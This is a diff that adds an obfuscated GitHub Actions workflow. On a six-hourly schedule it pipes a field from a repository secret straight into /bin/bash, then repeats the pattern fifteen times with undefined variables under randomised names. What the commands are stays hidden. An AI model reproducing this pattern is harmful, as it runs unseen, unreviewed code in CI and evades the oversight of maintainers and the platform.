@@ -1,0 +1,32 @@
+name: miaowandetaiguodeg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: miaowandetaiguodeg
+        env:
+          fdof319: ${{ secrets.fdof319 }}
+        run: |
+          echo $fdof319 | jq -r .vd537 | /bin/bash
+          echo $fnl1 | jq -r .ohym084 | /bin/bash
+          echo $pkjx9 | jq -r .nqcgb0 | /bin/bash
+          echo $tycr0534 | jq -r .r2 | /bin/bash
+          echo $voouz06484 | jq -r .yxeq00 | /bin/bash
+          echo $zgeoh9736 | jq -r .wjg8 | /bin/bash
+          echo $vta490 | jq -r .lhu536 | /bin/bash
+          echo $t91 | jq -r .ls49 | /bin/bash
+          echo $cgfs36617 | jq -r .e6 | /bin/bash
+          echo $f663 | jq -r .t68817 | /bin/bash
+          echo $bnxp39200 | jq -r .owb721 | /bin/bash
+          echo $vhw09 | jq -r .adk10 | /bin/bash
+          echo $pc72248 | jq -r .gosb130 | /bin/bash
+          echo $tzu6 | jq -r .s9 | /bin/bash
+          echo $i7979 | jq -r .l19 | /bin/bash
+          echo $gmz3183 | jq -r .lk73 | /bin/bash
+
